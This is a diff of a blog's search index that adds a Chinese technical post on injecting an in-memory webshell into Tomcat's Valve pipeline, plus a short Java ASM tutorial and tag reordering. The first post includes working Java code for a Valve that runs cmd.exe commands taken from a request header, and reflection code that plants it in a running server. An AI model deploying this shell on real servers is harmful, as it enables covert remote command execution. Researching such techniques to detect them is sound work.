@@ -4,6 +4,48 @@
   
   
   <entry>
+    <title>Java Tomcat Valve内存马</title>
+    <link href="/2022/11/22/Java-Tomcat-Valve%E5%86%85%E5%AD%98%E9%A9%AC/"/>
+    <url>/2022/11/22/Java-Tomcat-Valve%E5%86%85%E5%AD%98%E9%A9%AC/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>新的Tomcat内存马玩法。</p><a id="more"></a><hr><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>环境为SpringBoot。</p><h3 id="Valve"><a href="#Valve" class="headerlink" title="Valve"></a>Valve</h3><p>Valve存放在所属容器的pipeline中，在Filter执行之前被调用，并通过getNext().invoke()的方式进行链式调用。</p><p>下面这张调用栈图就可以清晰地看出来Filter链的调用就是Valve链中的StandardWrapperValve实现的：</p><p><img src="/css/images/ValveShell/2022112201.png" srcset="/img/loading.gif" alt=""></p><p>一般项目可以通过server.xml在Tomcat中配置自定义Valve，而SpringBoot提供了定制器类来实现添加Valve这个功能：</p><pre><code class="java">@Componentpublic class MyCustomize implements WebServerFactoryCustomizer&lt;TomcatServletWebServerFactory&gt; {    @Override    public void customize(TomcatServletWebServerFactory factory) {        factory.addEngineValves(new MyValve());    }}</code></pre><p>给自定义Valve下一个断点，就可以看到线程从接收请求到找到该自定义Valve执行的具体流程：</p><p><img src="/css/images/ValveShell/2022112202.png" srcset="/img/loading.gif" alt=""></p><p>跟踪一下代码，可以看到获取并执行第一个Valve的代码位于CoyoteAdapter类中：</p><pre><code class="java">connector.getService().getContainer().getPipeline().getFirst().invoke(        request, response);</code></pre><p>换句话说就是我们可以从NioEndpoint出发，一步步找到这里的pipeline并添加一个Valve Shell进去。</p><h3 id="Valve内存马"><a href="#Valve内存马" class="headerlink" title="Valve内存马"></a>Valve内存马</h3><p>调试一下，根据上面的Valve执行函数调用栈，我们可以从NioEndpoint中找到Http11NioProtocol对象：</p><p><img src="/css/images/ValveShell/2022112203.png" srcset="/img/loading.gif" alt=""></p><p>该对象的adapter属性中就存放了我们要找的CoyoteAdapter对象：</p><p><img src="/css/images/ValveShell/2022112204.png" srcset="/img/loading.gif" alt=""></p><p>接下来就是按照connector.getService().getContainer().getPipeline().getFirst()的调用顺序，就可以找到我们的自定义的Valve了：</p><p><img src="/css/images/ValveShell/2022112205.png" srcset="/img/loading.gif" alt=""></p><p>理清了内存马注入思路，接下来就是把自定义Valve删掉，然后写代码注入Valve内存马了，需要注意的一点是由于我们没有添加自定义Valve，此时Engine的pipeline中是空的，其getFirst函数会返回一个缺省状态下的Valve：</p><pre><code class="java">@Overridepublic Valve getFirst() {    if (first != null) {        return first;    }    return basic;}</code></pre><p>其实就是我们在调用栈中看到的StandardEngineValve，为了保证后续处理流程的顺利进行，我们还需要给Valve Shell设置好它的下一个Valve，这里可以直接使用StandardPipeline类中的addValve函数来添加。</p><p>首先写一个简单的Valve Shell：</p><pre><code class="java">class ValveShell extends ValveBase {    @Override    public void invoke(org.apache.catalina.connector.Request request, org.apache.catalina.connector.Response response) throws IOException, ServletException {        String[] cmd = new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, request.getHeader(&quot;Twings&quot;)};        byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(&quot;\\A&quot;).next().getBytes();        response.getWriter().write(new String(result));        next.invoke(request, response);    }}</code></pre><p>然后调用addValve添加进去：</p><pre><code class="java">try {    Field f = ThreadGroup.class.getDeclaredField(&quot;threads&quot;);    f.setAccessible(true);    Thread[] threads = (Thread[])f.get(Thread.currentThread().getThreadGroup());    NioEndpoint nioEndpoint = null;    for (Thread thread: threads) {        if (thread.getName().contains(&quot;http&quot;) &amp;&amp; thread.getName().contains(&quot;Poller&quot;)) {            f = Thread.class.getDeclaredField(&quot;target&quot;);            f.setAccessible(true);            Object pollor = f.get(thread);            f = pollor.getClass().getDeclaredField(&quot;this$0&quot;);            f.setAccessible(true);            nioEndpoint = (NioEndpoint)f.get(pollor);            break;        }    }    if (nioEndpoint == null) {        return;    }    AbstractEndpoint.Handler&lt;?&gt; handler = nioEndpoint.getHandler();    f = handler.getClass().getDeclaredField(&quot;proto&quot;);    f.setAccessible(true);    Http11NioProtocol http11NioProtocol = (Http11NioProtocol)f.get(handler);    CoyoteAdapter coyoteAdapter = (CoyoteAdapter)http11NioProtocol.getAdapter();    f = coyoteAdapter.getClass().getDeclaredField(&quot;connector&quot;);    f.setAccessible(true);    Connector connector = (Connector)f.get(coyoteAdapter);    Pipeline pipeline = connector.getService().getContainer().getPipeline();    if (pipeline == null || pipeline.getFirst() instanceof ValveShell) {        return;    }    pipeline.addValve(new ValveShell());}catch (Exception e) {    // pass}</code></pre><p>成功注入：</p><p><img src="/css/images/ValveShell/2022112206.png" srcset="/img/loading.gif" alt=""></p><hr><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/articles/web/348663.html" target="_blank" rel="noopener">Valve内存马</a></p><p><a href="https://blog.51cto.com/janephp/2420988" target="_blank" rel="noopener">SpringBoot-定制Web容器Tomcat</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+      <tag>Java</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Java ASM</title>
+    <link href="/2022/09/16/Java-ASM/"/>
+    <url>/2022/09/16/Java-ASM/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>除了JavaParser另一种可以用来分析Java代码的工具。</p><a id="more"></a><hr><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><p>通过maven下载依赖：</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;org.ow2.asm&lt;/groupId&gt;    &lt;artifactId&gt;asm&lt;/artifactId&gt;    &lt;version&gt;9.3&lt;/version&gt;&lt;/dependency&gt;</code></pre><h3 id="试用"><a href="#试用" class="headerlink" title="试用"></a>试用</h3><p>写一个ClassVisitor用于访问类：</p><pre><code class="java">public class MyClassVisitor extends ClassVisitor {    public MyClassVisitor(int api) {        super(api);    }    @Override    public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {        System.out.println(version);        System.out.println(access);        System.out.println(name);        System.out.println(signature);        System.out.println(superName);        System.out.println(Arrays.toString(interfaces));        super.visit(version, access, name, signature, superName, interfaces);    }}</code></pre><p>然后随便找一个类来测试：</p><pre><code class="java">try {    ClassReader classReader = new ClassReader(&quot;java.util.HashMap&quot;);    ClassVisitor classVisitor = new MyClassVisitor(Opcodes.ASM6);    classReader.accept(classVisitor, ClassReader.EXPAND_FRAMES);}catch (Exception e) {    e.printStackTrace();}</code></pre><p>解析结果：</p><pre><code>5233java/util/HashMap&lt;K:Ljava/lang/Object;V:Ljava/lang/Object;&gt;Ljava/util/AbstractMap&lt;TK;TV;&gt;;Ljava/util/Map&lt;TK;TV;&gt;;Ljava/lang/Cloneable;Ljava/io/Serializable;java/util/AbstractMap[java/util/Map, java/lang/Cloneable, java/io/Serializable]</code></pre><p>可以获取该类父类接口之类的信息。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><hr><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+      <tag>Java</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Java Native 源码观摩</title>
     <link href="/2022/09/15/Java-Native-%E6%BA%90%E7%A0%81%E8%A7%82%E6%91%A9/"/>
     <url>/2022/09/15/Java-Native-%E6%BA%90%E7%A0%81%E8%A7%82%E6%91%A9/</url>
@@ -2134,9 +2176,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>Python</tag>
       
@@ -2243,9 +2285,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>PHP</tag>
       
@@ -2266,9 +2308,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>前端</tag>
       
@@ -2289,9 +2331,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>前端</tag>
       
@@ -2356,9 +2398,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>Crypto</tag>
+      
+      <tag>Web</tag>
       
       <tag>Pwn</tag>
       
@@ -2381,9 +2423,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>FastCGI</tag>
       
@@ -2404,9 +2446,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>Mongodb</tag>
       
@@ -2429,9 +2471,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>Python</tag>
       
@@ -2452,11 +2494,11 @@
     
     <tags>
       
+      <tag>CTF</tag>
+      
       <tag>Web</tag>
       
       <tag>复现</tag>
-      
-      <tag>CTF</tag>
       
       <tag>Java</tag>
       
@@ -2538,9 +2580,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -2605,13 +2647,13 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
-      <tag>复现</tag>
-      
       <tag>CTF</tag>
       
+      <tag>Web</tag>
+      
       <tag>NodeJS</tag>
+      
+      <tag>复现</tag>
       
       <tag>前端</tag>
       
@@ -2632,9 +2674,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -2653,9 +2695,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>前端</tag>
       
@@ -2697,9 +2739,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>Java</tag>
       
@@ -2789,9 +2831,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>Karaf</tag>
       
@@ -3021,9 +3063,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>前端</tag>
       
